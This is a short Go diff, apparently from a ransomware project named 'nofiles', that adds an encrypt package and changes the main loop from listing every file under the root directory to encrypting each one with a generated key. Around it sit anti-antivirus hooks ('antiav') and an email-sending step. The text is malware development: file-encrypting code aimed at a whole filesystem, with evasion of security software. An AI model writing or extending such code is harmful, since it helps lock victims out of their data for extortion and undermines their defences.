@@ -4,6 +4,7 @@ import (
 	"nofiles/antiav"
 	"nofiles/mail"
 	"nofiles/files"
+	"nofiles/encrypt"
 
 	"log"
 )
@@ -36,9 +37,11 @@ func main() {
 		log.Println("Cannot send email:", err)
 	}
 
+	key := encrypt.GenerateKey()
+
 	files := files.Files("/")
 	for _, file := range files {
-		log.Println(file)
+		encrypt.Encrypt(key, file)
 	}
 
 	err = antiav.After()
